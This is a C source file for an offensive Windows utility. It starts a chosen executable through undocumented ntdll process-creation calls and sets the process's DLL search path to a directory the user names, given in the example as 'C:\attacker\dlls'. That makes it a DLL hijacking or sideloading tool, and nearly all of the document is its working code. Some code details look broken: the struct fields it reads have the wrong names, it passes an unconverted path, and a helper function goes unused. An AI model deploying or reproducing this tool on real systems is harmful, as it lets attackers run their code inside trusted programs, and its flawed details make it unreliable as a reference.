// Force DLL Search Path via RTL_USER_PROCESS_PARAMETERS
// This technique allows you to control where a target process
// looks for DLLs by setting the DllPath field when creating it.
//
// Compile: cl /link ntdll.lib force_dllpath.c
// Or: x86_64-w64-mingw32-gcc -o force_dllpath.exe force_dllpath.c -lntdll
//
// Usage: force_dllpath.exe <target_exe_path> <dll_search_directory>
//
// Example: force_dllpath.exe "C:\Program Files\App\app.exe" "C:\attacker\dlls"

#include <windows.h>
#include <winternl.h>
#pragma comment(lib, "ntdll.lib")

// Function prototypes (not always in winternl.h)
typedef NTSTATUS (NTAPI *RtlCreateProcessParametersEx_t)(
    PRTL_USER_PROCESS_PARAMETERS *pProcessParameters,
    PUNICODE_STRING ImagePathName,
    PUNICODE_STRING DllPath,
    PUNICODE_STRING CurrentDirectory,
    PUNICODE_STRING CommandLine,
    PVOID Environment,
    PUNICODE_STRING WindowTitle,
    PUNICODE_STRING DesktopInfo,
    PUNICODE_STRING ShellInfo,
    PUNICODE_STRING RuntimeData,
    ULONG Flags
);

typedef NTSTATUS (NTAPI *RtlCreateUserProcess_t)(
    PUNICODE_STRING NtImagePathName,
    ULONG Attributes,
    PRTL_USER_PROCESS_PARAMETERS ProcessParameters,
    PSECURITY_DESCRIPTOR ProcessSecurityDescriptor,
    PSECURITY_DESCRIPTOR ThreadSecurityDescriptor,
    HANDLE ParentProcess,
    BOOLEAN InheritHandles,
    HANDLE DebugPort,
    HANDLE ExceptionPort,
    PRTL_USER_PROCESS_INFORMATION ProcessInformation
);

// Helper: Get directory from module path
static void DirFromModule(HMODULE h, wchar_t *out, DWORD cch) {
    DWORD n = GetModuleFileNameW(h, out, cch);
    for (DWORD i = n; i > 0; --i) {
        if (out[i - 1] == L'\\') {
            out[i - 1] = 0;
            break;
        }
    }
}

int wmain(int argc, wchar_t *argv[]) {
    if (argc < 3) {
        wprintf(L"Usage: %s <target_exe> <dll_search_dir>\n", argv[0]);
        wprintf(L"Example: %s \"C:\\Program Files\\App\\app.exe\" \"C:\\attacker\\dlls\"\n", argv[0]);
        return 1;
    }

    const wchar_t *targetExe = argv[1];
    const wchar_t *dllSearchDir = argv[2];

    // Initialize Unicode strings
    UNICODE_STRING uImage, uCmd, uDllPath, uCurDir;
    RtlInitUnicodeString(&uImage, targetExe);
    RtlInitUnicodeString(&uCmd, targetExe);
    RtlInitUnicodeString(&uDllPath, dllSearchDir);
    RtlInitUnicodeString(&uCurDir, dllSearchDir);

    // Get function pointers from ntdll
    HMODULE hNtdll = GetModuleHandleW(L"ntdll.dll");
    RtlCreateProcessParametersEx_t pRtlCreateProcessParametersEx =
        (RtlCreateProcessParametersEx_t)GetProcAddress(hNtdll, "RtlCreateProcessParametersEx");
    RtlCreateUserProcess_t pRtlCreateUserProcess =
        (RtlCreateUserProcess_t)GetProcAddress(hNtdll, "RtlCreateUserProcess");

    if (!pRtlCreateProcessParametersEx || !pRtlCreateUserProcess) {
        wprintf(L"Failed to get ntdll function pointers\n");
        return 1;
    }

    // Create process parameters with custom DllPath
    RTL_USER_PROCESS_PARAMETERS *pp = NULL;
    NTSTATUS st = pRtlCreateProcessParametersEx(
        &pp, &uImage, &uDllPath, &uCurDir, &uCmd,
        NULL, NULL, NULL, NULL, NULL, 0
    );

    if (st < 0) {
        wprintf(L"RtlCreateProcessParametersEx failed: 0x%lx\n", st);
        return 1;
    }

    // Create the process
    RTL_USER_PROCESS_INFORMATION pi = {0};
    st = pRtlCreateUserProcess(
        &uImage, 0, pp, NULL, NULL, NULL,
        FALSE, NULL, NULL, &pi
    );

    if (st < 0) {
        wprintf(L"RtlCreateUserProcess failed: 0x%lx\n", st);
        return 1;
    }

    wprintf(L"Process created successfully\n");
    wprintf(L"PID: %lu\n", pi.ProcessInformation.ProcessId);
    wprintf(L"Target will search for DLLs in: %s\n", dllSearchDir);

    // Close handles
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);

    return 0;
}
